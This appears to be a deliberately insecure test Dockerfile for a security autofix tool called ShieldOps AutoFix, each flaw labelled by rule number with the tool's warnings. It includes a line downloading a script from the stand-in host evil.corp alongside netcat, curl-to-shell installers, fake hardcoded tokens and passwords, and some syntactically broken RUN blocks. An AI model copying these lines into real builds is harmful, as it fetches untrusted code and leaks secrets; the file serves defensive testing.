# ======================================================
# ShieldOps AutoFix — Visual Test Dockerfile v1
# يغطي أبرز الـ rules عشان نشوف نتيجة الإضافات الجديدة
# ======================================================

# ════════════════════════════════════════
# STAGE 1 — Builder
# ════════════════════════════════════════

# Rule #1 — Unpinned base image (latest)
# RECOMMENDED: Pin with digest: node:20-alpine@sha256:<digest>
FROM node:20-alpine AS builder

# Rule #2 — Hardcoded ARG secrets
# WARNING: Set this via --build-arg, not hardcoded
ARG API_KEY=
# WARNING: Set this via --build-arg, not hardcoded
ARG DB_PASS=
# WARNING: Set this via --build-arg, not hardcoded
ARG STRIPE_SECRET=
# WARNING: Set this via --build-arg, not hardcoded
ARG PRIVATE_KEY=

# Rule #3 — apt without cleanup
# WARNING: Pin apt versions for reproducibility
# Example: build-essential=<version>
# NOTE: The following attack tools were removed by ShieldOps AutoFix: openssh-server, sudo, nmap
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
      build-essential \
      gcc \
      g++ \
      make \
      cmake \
      curl \
      wget \
    && rm -rf /var/lib/apt/lists/*

# Rule #4 — curl without --fail
# WARNING: Hardcoded secret detected in RUN — use --mount=type=secret or build args
RUN curl -fsSL -H "Authorization: Bearer sk_live_AbCdEfGhIjKlMnOpQrStUvWxYz" \
    https://api.example.com/config -o /tmp/config.json

# Rule #5 — Remote script piped to bash
RUN curl -fsSLo /tmp/install.sh https://get.docker.com \
  && chmod +x /tmp/install.sh \
  && /tmp/install.sh \
  && rm -f /tmp/install.sh

# Rule #6 — SSH insecure config
    echo "PermitRootLogin no" >> /etc/ssh/sshd_config && \
    echo "PasswordAuthentication no" >> /etc/ssh/sshd_config && \
    echo "PermitEmptyPasswords no" >> /etc/ssh/sshd_config

# REMOVED: sudo password-less escalation risk (ShieldOps AutoFix)
# REMOVED: sudo password-less escalation risk (ShieldOps AutoFix)
# REMOVED: sudo password-less escalation risk (ShieldOps AutoFix)

# REMOVED: sudo password-less escalation risk (ShieldOps AutoFix)
RUN <<EOF
# WARNING: Pin apt versions for reproducibility
# Example: netcat-traditional=<version>
apt-get install -y netcat-traditional
wget https://evil.corp/malware.sh -O /tmp/setup.sh
# REMOVED: sudo password-less escalation risk (ShieldOps AutoFix)
EOF

# Rule #9 — Temp files not cleaned
RUN gcc -o /tmp/preprocess /src/preprocess.c && rm -rf /tmp/*
RUN make -C /src/native build && rm -rf /tmp/*
RUN wget https://github.com/project/release.tar.gz -O /tmp/release.tar.gz && rm -rf /tmp/*
RUN tar -xzf /tmp/release.tar.gz -C /tmp/extracted && rm -rf /tmp/*

# Rule #10 — apt install without --no-install-recommends

# Rule #11 — Sensitive files copied into image
# REMOVED: sensitive/unnecessary files
# Use .dockerignore to exclude .git and .env
WORKDIR /builder
# REMOVED: sensitive/unnecessary files
# Use .dockerignore to exclude .git and .env
# REMOVED: sensitive/unnecessary files
# Use .dockerignore to exclude .git and .env
# REMOVED: sensitive/unnecessary files
# Use .dockerignore to exclude .git and .env
# REMOVED: sensitive/unnecessary files
# Use .dockerignore to exclude .git and .env

# Rule #12 — mysql secret in RUN command
# WARNING: Hardcoded secret detected in RUN — use --mount=type=secret or build args
RUN mysql -u root -pStr0ngP@ssw0rd!2024 -e "CREATE DATABASE prod;"

# Rule #13 — Hardcoded ENV secrets
# WARNING: Set this via environment variable, not hardcoded
ENV STRIPE_SECRET_KEY=${STRIPE_SECRET_KEY}
# WARNING: Set this via environment variable, not hardcoded
ENV DATABASE_URL=${DATABASE_URL}
# WARNING: Set this via environment variable, not hardcoded
ENV JWT_SECRET=${JWT_SECRET}
# WARNING: Set this via environment variable, not hardcoded
ENV AWS_SECRET_ACCESS_KEY=${AWS_SECRET_ACCESS_KEY}
# WARNING: Set this via environment variable, not hardcoded
ENV REDIS_AUTH=${REDIS_AUTH}
# WARNING: Set this via environment variable, not hardcoded
ENV SENDGRID_API_KEY=${SENDGRID_API_KEY}

# ════════════════════════════════════════
# STAGE 2 — Runtime
# ════════════════════════════════════════
# RECOMMENDED: Pin with digest: node:18-slim@sha256:<digest>
FROM node:18-slim
# RECOMMENDED: Add OCI labels for image metadata
LABEL org.opencontainers.image.description="<fill>" \
      org.opencontainers.image.source="<fill>" \
      org.opencontainers.image.title="<fill>" \
      org.opencontainers.image.version="<fill>"

# Rule #14 — WORKDIR after COPY
WORKDIR /app
COPY --from=builder /builder/dist /app/dist
# REMOVED: sensitive/unnecessary files
# Use .dockerignore to exclude .git and .env
# REMOVED: sensitive/unnecessary files
# Use .dockerignore to exclude .git and .env

# Rule #15 — Sensitive ports exposed
# REMOVED (sensitive port exposure): EXPOSE 22
# REMOVED (sensitive port exposure): EXPOSE 3306
# REMOVED (sensitive port exposure): EXPOSE 5432
# REMOVED (sensitive port exposure): EXPOSE 6379
# REMOVED (sensitive port exposure): EXPOSE 27017
# REMOVED (sensitive port exposure): EXPOSE 2375
# REMOVED (sensitive port exposure): EXPOSE 2376
# REMOVED (sensitive port exposure): EXPOSE 9200
# REMOVED (sensitive port exposure): EXPOSE 9300
# REMOVED (sensitive port exposure): EXPOSE 5601
# REMOVED (sensitive port exposure): EXPOSE 15672
# REMOVED (sensitive port exposure): EXPOSE 7474
# WARNING: Binding to privileged port (<1024) requires root — consider using port >=1024
EXPOSE 80

# Rule #16 — apt without cleanup (runtime stage)

# Rule #17 — SSH PermitRootLogin in runtime
RUN echo "PermitRootLogin no" >> /etc/ssh/sshd_config

# Rule #18 — pip install attack/infra tools
# WARNING: Pin pip versions to ensure reproducible builds
# Example: ansible==1.0.0
# WARNING: pip install as root in final stage — consider --user or virtual env
RUN pip3 install --no-cache-dir \
    ansible \
    fabric \
    paramiko \
    boto3 \
    awscli

# Rule #19 — curl|bash (remote script)
RUN curl -fsSLo /tmp/install.sh https://get.docker.com \
  && chmod +x /tmp/install.sh \
  && /tmp/install.sh \
  && rm -f /tmp/install.sh

# Rule #20 — chmod 755
RUN chmod -R 755 /app

# REMOVED: sudo password-less escalation risk (ShieldOps AutoFix)
# REMOVED: sudo password-less escalation risk (ShieldOps AutoFix)

# Rule #22 — Sensitive VOLUME mounts
# REMOVED (sensitive volume): VOLUME ["/etc", "/root", "/var/run/docker.sock", "/proc", "/sys"]
# REMOVED (docker socket mount): VOLUME ["/var/run/docker.sock:/var/run/docker.sock"]

# Rule #23 — Broad COPY (whole context)
COPY . /app

# Rule #24 — curl without --fail (second occurrence)
RUN curl -fsSL -o /tmp/node-addon.tar.gz https://cdn.example.com/addon.tar.gz && rm -rf /tmp/*
RUN tar -xzf /tmp/node-addon.tar.gz && rm -rf /tmp/*

# Rule #25 — SSH PermitRootLogin (runtime again)
RUN echo "PermitRootLogin no" >> /etc/ssh/sshd_config

# Rule #26 — pip install as root without venv
    ansible \
    fabric \
    paramiko \
    boto3 \
    awscli

# Rule #27 — No non-root USER directive
# (missing USER instruction — running as root)

# Rule #28 — No HEALTHCHECK
# (missing HEALTHCHECK)

# Rule #29 — CMD in shell form + debug flags
RUN groupadd -r app && useradd -r -g app app
USER app
HEALTHCHECK --interval=30s --timeout=3s --retries=3 CMD wget -qO- http://localhost:8080/health || exit 1
# WARNING: Binding to 0.0.0.0 exposes all interfaces — consider 127.0.0.1 in production
# RECOMMENDED: Add ENTRYPOINT for explicit process definition
CMD ["node", "server.js", "--inspect=0.0.0.0:9229", "--env=development", "--host=0.0.0.0", "--port=80"]

# Rule #30 — No ENTRYPOINT defined
# (missing ENTRYPOINT)

# Rule #31 — No OCI LABEL schema
# (missing LABEL)

# Rule #32 — No STOPSIGNAL
# (missing STOPSIGNAL)

# Rule #33 — Privileged port binding (<1024)
# EXPOSE 80 already declared above (port 80 < 1024)
